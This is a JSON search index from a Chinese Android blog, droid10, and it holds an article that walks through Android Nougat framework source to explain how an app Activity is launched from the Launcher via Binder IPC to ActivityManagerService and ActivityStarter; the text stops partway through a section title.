{"config":{"lang":["ja"],"separator":"[\\s\\-\uff0c\u3002]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Android10","text":""},{"location":"#_1","title":"\u5de5\u4f5c\u518d\u7e41\u5fd9\uff0c\u4eab\u4e00\u65f6\u79d1\u6280\u4e50\u8da3","text":"<p>\u6b22\u8fce\u6765\u5230 droid10\u3002</p> <p>droid10 \u6d89\u53caAndroid10\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5f00\u53d1\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c\u4f18\u8d28\u535a\u5ba2\u7684\u83b7\u53d6\u9700\u8981\u8017\u8d39\u5927\u91cf\u7cbe\u529b\uff0c\u800c\u540c\u65f6\u72ec\u7acb\u535a\u5ba2\u5173\u7ad9\u7684\u6bd4\u4f8b\u8d8a\u6765\u8d8a\u9ad8\u3002</p> <p>\u4f5c\u4e3a\u4e00\u4e2a\u5c01\u95ed\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 \u7231\u597d\u4e0e\u5de5\u4f5c\uff0cdroid10 \u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u6574\u7406\uff0c\u4ee5\u4fbf\u4e8e\u81ea\u5df1\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \u76f8\u5173\u7684\u77e5\u8bc6\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","title":"Android AppActivity \u542f\u52a8\u6d41\u7a0b\u5206\u6790","text":"<p>AMS(ActivityManagerService) \u4f1a\u542f\u52a8 Launcher \u6765\u5c55\u793a\u6211\u4eec\u624b\u673a\u4e2d\u6240\u6709\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u56fe\u6807\uff0c\u70b9\u51fb\u56fe\u6807\u540e\u76f8\u5e94\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u4f1a\u88ab\u7cfb\u7edf\u542f\u52a8\u8fd0\u884c\u5e76\u5c55\u793a\u5728\u6211\u4eec\u9762\u524d\uff0c\u90a3\u4e48\uff0c\u70b9\u51fb\u4e86\u56fe\u6807\u4e4b\u540e\u7cfb\u7edf\u9053\u7406\u505a\u4e86\u54ea\u4e9b\u5de5\u4f5c\u5462\uff1f\u5e94\u7528\u8fdb\u7a0b\u662f\u600e\u4e48\u88ab\u542f\u52a8\u7684\u5462\uff1fActivity \u7684\u751f\u547d\u5468\u671f\u662f\u4ec0\u4e48\u65f6\u5019\u88ab\u8c01\u8c03\u7528\u7684\u5462\uff1f\u672c\u6587\u5c06\u7ee7\u7eed\u57fa\u4e8e Android Nougat \u7684 frameworks \u5c42\u6e90\u7801\u7684\u89e3\u7b54\u8fd9\u4e9b\u95ee\u9898\u3002</p> <p>\u9605\u8bfb\u5efa\u8bae\uff1a \u5982\u679c\u4f60\u662f\u9996\u6b21\u9605\u8bfb\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u6e90\u7801\uff0c\u5efa\u8bae\u4f60\u5ffd\u7565\u4e00\u4e9b\u7ec6\u679d\u672b\u8282\u7684\u4ee3\u7801\uff0c\u5148\u6293\u4e3b\u5e72\u4ee3\u7801\uff0c\u4ece\u6574\u4f53\u4e0a\u7406\u89e3\u4ee3\u7801\u7684\u6267\u884c\u6d41\u7a0b\uff08\u53f3\u4e0b\u89d2\u6587\u7ae0\u76ee\u5f55\u89c6\u56fe\u4e2d\u53ef\u4ee5\u70b9\u51fb\u8df3\u8f6c\u5230\u76f8\u5e94\u7ae0\u8282\uff09\uff0c\u5426\u5219\u5c06\u4f1a\u88ab\u7ec6\u8282\u7684\u4ee3\u7801\u6270\u4e71\u601d\u8def\u3002\u6700\u540e\u53ef\u4ee5\u56de\u5934\u591a\u770b\u51e0\u904d\uff0c\u8fd9\u65f6\u5019\u5982\u679c\u6709\u9700\u8981\u53ef\u4ee5\u8ffd\u8e2a\u4e00\u4e9b\u679d\u5e72\u4ee3\u7801\uff0c\u505a\u5230\u878d\u4f1a\u8d2f\u901a\u3002</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-launcher-ams","title":"1. Launcher \u2014\u2014 AMS","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#11","title":"1.1 \u8c03\u7528\u8fc7\u7a0b\u5206\u6790","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#111-launcheronclick","title":"1.1.1 Launcher.onClick","text":"<p>\u5728 Launcher app \u7684\u4e3b Activity \u2014\u2014 Launcher.java \u4e2d\uff0cApp \u56fe\u6807\u7684\u70b9\u51fb\u4e8b\u4ef6\u6700\u7ec8\u4f1a\u56de\u8c03 Launcher.java \u4e2d\u7684 onClick \u65b9\u6cd5\uff0c</p> <p>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java\uff1a</p> <pre><code>public void onClick(View v) {\n    ...\n    Object tag = v.getTag();\n    if (tag instanceof ShortcutInfo) {\n        // \u4ece\u5feb\u6377\u65b9\u5f0f\u56fe\u6807\u542f\u52a8\n        onClickAppShortcut(v);\n    } else if (tag instanceof FolderInfo) {\n        // \u6587\u4ef6\u5939\n        if (v instanceof FolderIcon) {\n           onClickFolderIcon(v);\n        }\n    } else if (v == mAllAppsButton) {\n        // \u201c\u6240\u6709\u5e94\u7528\u201d\u6309\u94ae\n        onClickAllAppsButton(v);\n    } else if (tag instanceof AppInfo) {\n        // \u4ece\u201c\u6240\u6709\u5e94\u7528\u201d\u4e2d\u542f\u52a8\u7684\u5e94\u7528\n        startAppShortcutOrInfoActivity(v);\n    } else if (tag instanceof LauncherAppWidgetInfo) {\n        // \u7ec4\u4ef6\n        if (v instanceof PendingAppWidgetHostView) {\n            onClickPendingWidget((PendingAppWidgetHostView) v);\n        }\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#112-launcheronclickappshortcut","title":"1.1.2 Launcher.onClickAppShortcut","text":"<p>\u5982\u679c\u662f\u5feb\u6377\u65b9\u5f0f\u56fe\u6807\uff0c\u5219\u8c03\u7528 onClickAppShortcut \u65b9\u6cd5\u8fdb\u800c\u8c03\u7528 startAppShortcutOrInfoActivity \u65b9\u6cd5\uff1a</p> <pre><code>@Thunk void startAppShortcutOrInfoActivity(View v) {\n    Object tag = v.getTag();\n    final ShortcutInfo shortcut;\n    final Intent intent;\n    if (tag instanceof ShortcutInfo) {\n        shortcut = (ShortcutInfo) tag;\n        // \u53bb\u9664\u5bf9\u5e94\u7684 Intent \u5bf9\u8c61\n        intent = shortcut.intent;\n        int[] pos = new int[2];\n        v.getLocationOnScreen(pos);\n        intent.setSourceBounds(new Rect(pos[0], pos[1],\n                pos[0] + v.getWidth(), pos[1] + v.getHeight()));\n\n    } else if (tag instanceof AppInfo) {\n        shortcut = null;\n        intent = ((AppInfo) tag).intent;\n    } else {\n        throw new IllegalArgumentException(\"Input must be a Shortcut or AppInfo\");\n    }\n\n    // \u8c03\u7528 startActivitySafely \u65b9\u6cd5\n    boolean success = startActivitySafely(v, intent, tag);\n    mStats.recordLaunch(v, intent, shortcut);\n\n    if (success &amp;&amp; v instanceof BubbleTextView) {\n        mWaitingForResume = (BubbleTextView) v;\n        mWaitingForResume.setStayPressed(true);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#113-launcherstartactivity","title":"1.1.3 Launcher.startActivity","text":"<p>\u83b7\u53d6\u76f8\u5e94 App \u7684 Intent \u4fe1\u606f\u4e4b\u540e\uff0c\u8c03\u7528 startActivity \u65b9\u6cd5\uff1a</p> <pre><code>private boolean startActivity(View v, Intent intent, Object tag) {\n    // \u542f\u52a8\u65b0\u7684\u4efb\u52a1\u6808\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    try {\n        ...\n        if (user == null || user.equals(UserHandleCompat.myUserHandle())) {\n            StrictMode.VmPolicy oldPolicy = StrictMode.getVmPolicy();\n            try {            \n                StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().detectAll()\n                        .penaltyLog().build());\n                // \u8c03\u7528 Activity \u7684 startActivity \u65b9\u6cd5\n                startActivity(intent, optsBundle);\n            } finally {\n                StrictMode.setVmPolicy(oldPolicy);\n            }\n        } else {\n            launcherApps.startActivityForProfile(intent.getComponent(), user,\n                    intent.getSourceBounds(), optsBundle);\n        }\n        return true;\n    } catch (SecurityException e) {      \n        ...\n    }\n    return false;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#114-activitystartactivity","title":"1.1.4 Activity.startActivity","text":"<p>\u8fd9\u91cc\u6700\u7ec8\u8c03\u7528\u4e86 Activity \u4e2d\u7684 startActivity \u65b9\u6cd5\uff0c\u5e76\u4e14\u8bbe\u7f6e Flag \u4e3a FLAG_ACTIVITY_NEW_TASK\u3002\u5230\u6b64\u4e3a\u6b62\uff0c\u5df2\u7ecf\u8ddf\u542f\u52a8\u666e\u901a\u7684 Activity \u6d41\u7a0b\u6c47\u5408\u8d77\u6765\u4e86\uff0c\u7ee7\u7eed\u5f80\u4e0b\u5206\u6790\u3002</p> <p>frameworks/base/core/java/android/app/Activity.java\uff1a</p> <pre><code>@Override\npublic void startActivity(Intent intent, @Nullable Bundle options) {\n    // \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a -1 \u8868\u793a\u4e0d\u9700\u8981\u56de\u8c03 onActivityResult \u65b9\u6cd5\n    if (options != null) {\n        startActivityForResult(intent, -1, options);\n    } else {\n        // Note we want to go through this call for compatibility with\n        // applications that may have overridden the method.\n        startActivityForResult(intent, -1);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#115-activitystartactivityforresult","title":"1.1.5 Activity.startActivityForResult","text":"<p>\u8c03\u7528 Activity \u7684 startActivityForResult \u65b9\u6cd5</p> <pre><code>public void startActivityForResult(@RequiresPermission Intent intent, int requestCode,\n           @Nullable Bundle options) {\n    // mParent \u662f\u5f53\u524d Activity \u7684\u7236\u7c7b\uff0c\u6b64\u65f6\u6761\u4ef6\u6210\u7acb\n    if (mParent == null) {\n        // \u8c03\u7528 Instrumentation \u7684 execStartActivity \u65b9\u6cd5\n        Instrumentation.ActivityResult ar = mInstrumentation.execStartActivity(this,\n               mMainThread.getApplicationThread(), mToken, this, intent, requestCode, options);\n        ...\n    } else {\n        ...\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#116-instrumentationexecstartactivity","title":"1.1.6 Instrumentation.execStartActivity","text":"<p>frameworks/base/core/java/android/app/Instrumentation.java\uff1a</p> <pre><code>public ActivityResult execStartActivity(\n        Context who, IBinder contextThread, IBinder token, Activity target,\n        Intent intent, int requestCode, Bundle options) {\n        ...\n    try {\n        intent.migrateExtraStreamToClipData();\n        intent.prepareToLeaveProcess(who);\n        // \u83b7\u53d6 AMS \u7684\u4ee3\u7406\u5bf9\u8c61\u5e76\u8c03\u7528\u5176 startActivity \u65b9\u6cd5\n        int result = ActivityManagerNative.getDefault()\n            .startActivity(whoThread, who.getBasePackageName(), intent,\n                    intent.resolveTypeIfNeeded(who.getContentResolver()),\n                    token, target != null ? target.mEmbeddedID : null,\n                    requestCode, 0, null, options);\n        checkStartActivityResult(result, intent);\n    } catch (RemoteException e) {\n        throw new RuntimeException(\"Failure from system\", e);\n    }\n    return null;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#117-activitymanagerproxystartactivity","title":"1.1.7 ActivityManagerProxy.startActivity","text":"<p>\u4ee5\u4e0a\u8fc7\u7a0b\u662f\u5728 Launcher App \u6240\u5728\u7684\u8fdb\u7a0b\u4e2d\u53d1\u751f\u7684\uff0c\u5728\u6211\u7684\u53e6\u5916\u4e00\u7bc7\u6587\u7ae0</p> <p>\u4e2d\u6211\u4eec\u5206\u6790\u4e86 AIDL \u7684\u5b9e\u73b0\u8fc7\u7a0b\uff0c\u7531\u4e8e\u8fdc\u7a0b Service \u8ddf\u4f7f\u7528 Service \u7684 Activity \u4e0d\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u56e0\u6b64\u4ed6\u4eec\u4e4b\u95f4\u4ea4\u4e92\u9700\u8981\u901a\u8fc7 Binder IPC \u673a\u5236\u7684\u652f\u6301\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2dClient \u9996\u5148\u83b7\u53d6\u5230 Server \u7aef\u7684\u4ee3\u7406\u5bf9\u8c61\uff0c\u5728 Client \u770b\u6765 Server \u4ee3\u7406\u5bf9\u8c61\u540c\u6837\u5177\u6709 Server \u672c\u5730\u5bf9\u8c61\u627f\u8bfa\u7684\u80fd\u529b\uff0c\u56e0\u6b64 Client \u53ef\u4ee5\u8c03\u7528 Server \u4ee3\u7406\u5bf9\u8c61\u8ddf Sever \u672c\u5730\u5bf9\u8c61\u8fdb\u884c\u6570\u636e\u4ea4\u4e92\uff0cBinder \u9a71\u52a8\u4f5c\u4e3a\u6865\u6881\u5728\u4ed6\u4eec\u4e2d\u95f4\u8d77\u5230\u4e2d\u95f4\u4eba\u7684\u4f5c\u7528\u3002</p> <p>\u5728Android \u7cfb\u7edf\u542f\u52a8\u6d41\u7a0b\u5206\u6790\u4e2d\u66fe\u7ecf\u5206\u6790\u8fc7\uff0cAMS \u662f\u8fd0\u884c\u5728 system_server \u7ebf\u7a0b\u4e2d\u7684\uff0c\u8fd9\u65f6 AMS \u5c31\u76f8\u5f53\u4e8e AIDL \u4e2d\u7684\u8fdc\u7a0b Service\uff0cApp \u8fdb\u7a0b\u8981\u4e0e AMS \u4ea4\u4e92\uff0c\u9700\u8981\u901a\u8fc7 AMS \u7684\u4ee3\u7406\u5bf9\u8c61 AMP(ActivityManagerProxy) \u6765\u5b8c\u6210\uff0c\u6765\u770b ActivityManagerNative.getDefault() \u62ff\u5230\u7684\u662f\u4ec0\u4e48\uff1a</p> <p>frameworks/base/core/java/android/app/ActivityManagerNative.java\uff1a</p> <pre><code>static public IActivityManager getDefault() {\n    return gDefault.get();\n}\n</code></pre> <p>getDefault \u662f\u4e00\u4e2a\u9759\u6001\u53d8\u91cf\uff1a</p> <pre><code>private static final Singleton&lt;IActivityManager&gt; gDefault = new Singleton&lt;IActivityManager&gt;() {\n    protected IActivityManager create() {\n        // \u5411 ServiceManager \u67e5\u8be2\u4e00\u4e2a key \u4e3a \"activity\" \u7684\u5f15\u7528\n        IBinder b = ServiceManager.getService(\"activity\");\n        if (false) {\n            Log.v(\"ActivityManager\", \"default service binder = \" + b);\n        }\n        IActivityManager am = asInterface(b);\n        if (false) {\n            Log.v(\"ActivityManager\", \"default service = \" + am);\n        }\n        return am;\n    }\n};\n</code></pre> <p>\u540c\u6837\uff0c\u5728\u6587\u7ae0</p> <p>\u4e2d\u4e5f\u8bb2\u5230\u8fc7\uff1a</p> <p>ServiceManager \u662f Binder IPC \u901a\u4fe1\u8fc7\u7a0b\u7684\u6838\u5fc3\uff0c\u662f\u4e0a\u4e0b\u6587\u7684\u7ba1\u7406\u8005\uff0cBinder \u670d\u52a1\u7aef\u5fc5\u987b\u5148\u5411 ServerManager \u6ce8\u518c\u624d\u80fd\u591f\u4e3a\u5ba2\u6237\u7aef\u63d0\u4f9b\u670d\u52a1\uff0cBinder \u5ba2\u6237\u7aef\u5728\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u4e4b\u524d\u9700\u8981\u4ece ServerManager \u4e2d\u67e5\u627e\u5e76\u83b7\u53d6 Binder \u670d\u52a1\u7aef\u7684\u5f15\u7528\u3002  </p> <p>\u8fd9\u91cc\u901a\u8fc7 \"activity\" \u8fd9\u4e2a\u540d\u5b57\u5411 ServiceManager \u67e5\u8be2 AMS \u7684\u5f15\u7528\uff0c\u83b7\u53d6 AMS \u7684\u5f15\u7528\u540e\uff0c\u8c03\u7528 asInterface \u65b9\u6cd5\uff1a</p> <pre><code>static public IActivityManager asInterface(IBinder obj) {\n    if (obj == null) {\n        return null;\n    }\n    // \u6839\u636e descriptor \u67e5\u8be2 obj \u662f\u5426\u4e3a Binder \u672c\u5730\u5bf9\u8c61\uff0c\u5177\u4f53\u8fc7\u7a0b\u8bf7\u770b\u524d\u6587\u4e2d\u63d0\u5230\u7684\u6587\u7ae0\n    IActivityManager in = (IActivityManager)obj.queryLocalInterface(descriptor);\n    if (in != null) {\n        return in;\n    }\n    // \u5982\u679c obj \u4e0d\u662f Binder \u672c\u5730\u5bf9\u8c61\uff0c\u5219\u5c06\u5176\u5305\u88c5\u6210\u4ee3\u7406\u5bf9\u8c61\u5e76\u8fd4\u56de\n    return new ActivityManagerProxy(obj);\n}\n</code></pre> <p>\u56e0\u4e3a AMS \u4e0e Launcher App \u4e0d\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u91cc\u8fd4\u56de\u7684 IBinder \u5bf9\u8c61\u662f\u4e00\u4e2a Binder \u4ee3\u7406\u5bf9\u8c61\uff0c\u56e0\u6b64\u8fd9\u7c7b\u5c06\u5176\u5305\u88c5\u6210 AMP(ActivityManagerProxy) \u5bf9\u8c61\u5e76\u8fd4\u56de\uff0cAMP \u662f AMN(ActivityManagerNative) \u7684\u5185\u90e8\u7c7b\uff0c\u67e5\u770b AMP \u7c7b \uff1a</p> <pre><code>class ActivityManagerProxy implements IActivityManager\n{\n    public ActivityManagerProxy(IBinder remote)\n    {\n        mRemote = remote;\n    }\n\n    public IBinder asBinder()\n    {\n        return mRemote;\n    }\n\n    public int startActivity(IApplicationThread caller, String callingPackage, Intent intent,\n            String resolvedType, IBinder resultTo, String resultWho, int requestCode,\n            int startFlags, ProfilerInfo profilerInfo, Bundle options) throws RemoteException {\n        ...\n        // \u8c03\u7528\u53f7\u4e3a START_ACTIVITY_TRANSACTION\n        mRemote.transact(START_ACTIVITY_TRANSACTION, data, reply, 0);\n        reply.readException();\n        int result = reply.readInt();\n        reply.recycle();\n        data.recycle();\n        return result;\n    }\n    ...\n    public ComponentName startService(IApplicationThread caller, Intent service,\n            String resolvedType, String callingPackage, int userId) throws RemoteException\n    {\n        ...\n        mRemote.transact(START_SERVICE_TRANSACTION, data, reply, 0);\n        reply.readException();\n        ComponentName res = ComponentName.readFromParcel(reply);\n        data.recycle();\n        reply.recycle();\n        return res;\n    }\n    ...\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0cAMP \u91cc\u9762\u5c06\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u901a\u8fc7 mRemote.transact \u8fdb\u884c\u8f6c\u53d1\uff0cmRemote \u5bf9\u8c61\u6b63\u662f Binder \u9a71\u52a8\u8fd4\u56de\u6765\u7684 Binder Proxy \u5bf9\u8c61\uff0c\u901a\u8fc7 Binder Proxy\uff0cBinder \u9a71\u52a8\u6700\u7ec8\u5c06\u8c03\u7528\u5904\u4e8e Binder Server \u7aef AMN \u4e2d\u7684 onTransact \u65b9\u6cd5\uff1a</p> <pre><code>@Override\npublic boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {\n    // \u6839\u636e\u65b9\u6cd5\u8c03\u7528\u53f7 code \u51b3\u5b9a\u8c03\u7528\u54ea\u4e2a\u65b9\u6cd5\n    switch (code) {\n    case START_ACTIVITY_TRANSACTION:\n    {\n        ...\n        // \u8c03\u7528 startActivity \u65b9\u6cd5\n        int result = startActivity(app, callingPackage, intent, resolvedType,\n                resultTo, resultWho, requestCode, startFlags, profilerInfo, options);\n        reply.writeNoException();\n        reply.writeInt(result);\n        return true;\n    }\n    ...\n    case START_SERVICE_TRANSACTION: {\n        ...\n        ComponentName cn = startService(app, service, resolvedType, callingPackage, userId);\n            reply.writeNoException();\n            ComponentName.writeToParcel(cn, reply);\n            return true;\n        }\n        ...\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#118-activitymanagerservicestartactivity","title":"1.1.8 ActivityManagerService.startActivity","text":"<p>AMN \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u7684 startActivity \u4e3a\u62bd\u8c61\u65b9\u6cd5\uff0c\u5177\u4f53\u7684\u5b9e\u73b0\u5728 frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java \u4e2d\uff1a</p> <pre><code>@Override\npublic final int startActivity(IApplicationThread caller, String callingPackage,\n        Intent intent, String resolvedType, IBinder resultTo, String resultWho, int requestCode,\n        int startFlags, ProfilerInfo profilerInfo, Bundle bOptions) {\n    return startActivityAsUser(caller, callingPackage, intent, resolvedType, resultTo,\n            resultWho, requestCode, startFlags, profilerInfo, bOptions,\n            UserHandle.getCallingUserId());\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#12","title":"1.2 \u5c0f\u7ed3","text":"<p>\u4ece Launcher App \u5230 AMS \u7684\u8c03\u7528\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86 Binder IPC \u673a\u5236\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u770b\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u6211\u4e4b\u524d\u5199\u7684\u4e24\u7bc7\u6587\u7ae0\u2014\u2014\u501f\u52a9 AIDL \u7406\u89e3 Android Binder \u673a\u5236\u2014\u2014Binder \u6765\u9f99\u53bb\u8109\u548c\u501f\u52a9 AIDL \u7406\u89e3 Android Binder \u673a\u5236\u2014\u2014AIDL \u7684\u4f7f\u7528\u548c\u539f\u7406\u5206\u6790\uff0c\u5e76\u4e14\u8fd0\u884c\u4e86\u6587\u7ae0\u4e2d\u4f7f\u7528\u5230\u7684 Demo\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u53d1\u73b0\uff0c\u76f8\u5bf9\u4e8e AIDL \u7684\u8c03\u7528\u8fc7\u7a0b\uff0c\u8c03\u7528\u65b9 Launcher App \u76f8\u5f53\u4e8e AIDL \u8fc7\u7a0b\u4e2d\u7684 Activity \u6240\u5728\u7684 App\uff0c\u5145\u5f53 Clinent \u7684\u89d2\u8272\uff1bAMS \u76f8\u5f53\u4e8e\u8fdc\u7a0b Service \u7684\u89d2\u8272\uff0c\u5145\u5f53 Server \u7aef\u89d2\u8272\uff0c\u4ed6\u4eec\u7684\u8c03\u7528\u8fc7\u7a0b\u603b\u4f53\u4e0a\u90fd\u662f\u4e00\u6837\u7684\u3002</p> <p>\u4ece Launcher App \u5230 AMS \u7684\u65f6\u5e8f\u56fe\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2-ams-zygote","title":"2. AMS \u2014\u2014 zygote","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#21","title":"2.1 \u8c03\u7528\u8fc7\u7a0b\u5206\u6790","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#211-activitymanagerservicestartactivityasuser","title":"2.1.1 ActivityManagerService.startActivityAsUser","text":"<p>\u63a5\u7740\u4ece AMS \u7684 startActivityAsUser \u65b9\u6cd5\u5f00\u59cb\u5206\u6790\uff1a</p> <pre><code>@Override\npublic final int startActivityAsUser(IApplicationThread caller, String callingPackage,\n        Intent intent, String resolvedType, IBinder resultTo, String resultWho, int requestCode,\n        int startFlags, ProfilerInfo profilerInfo, Bundle bOptions, int userId) {\n    enforceNotIsolatedCaller(\"startActivity\");\n    userId = mUserController.handleIncomingUser(Binder.getCallingPid(), Binder.getCallingUid(),\n                userId, false, ALLOW_FULL_ONLY, \"startActivity\", null);\n    // TODO: Switch to user app stacks here.\n    // \u8c03\u7528 ActivityStarter \u7684 startActivityMayWait \u65b9\u6cd5\n    return mActivityStarter.startActivityMayWait(caller, -1, callingPackage, intent,\n            resolvedType, null, null, resultTo, resultWho, requestCode, startFlags,\n            profilerInfo, null, null, bOptions, false, userId, null, null);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#212-activitystarterstartactivitymaywait","title":"2.1.2 ActivityStarter.startActivityMayWait","text":"<p>\u7ee7\u7eed\u8ddf\u8fdb frameworks/base/services/core/java/com/android/server/am/ActivityStarter.java\uff1a</p> <pre><code>final int startActivityMayWait(IApplicationThread caller, int callingUid,\n        String callingPackage, Intent intent, String resolvedType,\n        IVoiceInteractionSession voiceSession, IVoiceInteractor voiceInteractor,\n        IBinder resultTo, String resultWho, int requestCode, int startFlags,\n        ProfilerInfo profilerInfo, IActivityManager.WaitResult outResult, Configuration config,\n        Bundle bOptions, boolean ignoreTargetSecurity, int userId,\n        IActivityContainer iContainer, TaskRecord inTask) {\n   ...\n   synchronized (mService) {\n        ...\n        // \u8c03\u7528 startActivityLocked \u65b9\u6cd5\n        int res = startActivityLocked(caller, intent, ephemeralIntent, resolvedType,\n                aInfo, rInfo, voiceSession, voiceInteractor,\n                resultTo, resultWho, requestCode, callingPid,\n                callingUid, callingPackage, realCallingPid, realCallingUid, startFlags,\n                options, ignoreTargetSecurity, componentSpecified, outRecord, container,\n                inTask);\n        ...\n        return res;\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#213-activitystarterstartactivitylocked","title":"2.1.3 ActivityStarter.startActivityLocked","text":"<p>\u67e5\u770b startActivityLocked \u65b9\u6cd5\uff1a</p> <pre><code>final int startActivityLocked(IApplicationThread caller, Intent intent, Intent ephemeralIntent,\n        String resolvedType, ActivityInfo aInfo, ResolveInfo rInfo,\n        IVoiceInteractionSession voiceSession, IVoiceInteractor voiceInteractor,\n        IBinder resultTo, String resultWho, int requestCode, int callingPid, int callingUid,\n        String callingPackage, int realCallingPid, int realCallingUid, int startFlags,\n        ActivityOptions options, boolean ignoreTargetSecurity, boolean componentSpecified,\n        ActivityRecord[] outActivity, ActivityStackSupervisor.ActivityContainer container,\n        TaskRecord inTask) {\n    ...\n    // \u8c03\u7528 doPendingActivityLaunchesLocked \u65b9\u6cd5\uff0c\u4f20\u5165 false \u53c2\u6570\n    doPendingActivityLaunchesLocked(false);\n    ...\n    return err;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#214-activitystarterdopendingactivitylauncheslocked","title":"2.1.4 ActivityStarter.doPendingActivityLaunchesLocked","text":"<p>\u67e5\u770b doPendingActivityLaunchesLocked \u65b9\u6cd5\uff1a</p> <pre><code>final void doPendingActivityLaunchesLocked(boolean doResume) {\n    while (!mPendingActivityLaunches.isEmpty()) {\n        final PendingActivityLaunch pal = mPendingActivityLaunches.remove(0);\n        final boolean resume = doResume &amp;&amp; mPendingActivityLaunches.isEmpty();\n        try {\n            // \u8c03\u7528 startActivityUnchecked \u65b9\u6cd5\n            final int result = startActivityUnchecked(pal.r, pal.sourceRecord, null, null,\n                pal.startFlags, resume, null, null);\n            postStartActivityUncheckedProcessing(pal.r, result, mSupervisor.mFocusedStack.mStackId, \n                mSourceRecord, mTargetStack);\n        } catch (Exception e) {\n            Slog.e(TAG, \"Exception during pending activity launch pal=\" + pal, e);\n            pal.sendErrorResult(e.getMessage());\n        }\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#215-activitystarterstartactivityunchecked","title":"2.1.5 ActivityStarter.startActivityUnchecked","text":"<p>\u67e5\u770b startActivityUnchecked \u65b9\u6cd5\uff1a</p> <pre><code>private int startActivityUnchecked(final ActivityRecord r, ActivityRecord sourceRecord,\n        IVoiceInteractionSession voiceSession, IVoiceInteractor voiceInteractor,\n        int startFlags, boolean doResume, ActivityOptions options, TaskRecord inTask) {\n    ...  \n    // \u8c03\u7528 ActivityStackSupervisor \u7684 resumeFocusedStackTopActivityLocked \u65b9\u6cd5\n    mSupervisor.resumeFocusedStackTopActivityLocked();  \n    ... \n    return START_SUCCESS;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#216-activitystacksupervisorresumefocusedstacktopactivitylocked","title":"2.1.6 